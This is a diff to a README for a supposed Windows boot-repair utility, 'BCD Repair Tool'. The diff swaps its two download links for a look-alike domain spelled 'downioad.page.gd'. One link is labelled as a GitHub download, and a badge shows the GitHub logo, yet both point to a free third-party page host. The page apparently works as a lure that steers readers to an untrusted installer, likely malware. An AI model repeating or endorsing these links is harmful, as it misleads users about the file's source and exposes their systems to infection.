@@ -2,7 +2,7 @@
 
 BCD Repair Tool is a powerful Windows utility designed to fix and rebuild your Boot Configuration Data. Whether you're dealing with startup issues or corrupted BCD entries, this tool provides an easy and efficient solution for Windows 10 and 11 systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -73,7 +73,7 @@ We recommend checking for updates periodically, as new versions may include bug 
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: October 2026
 
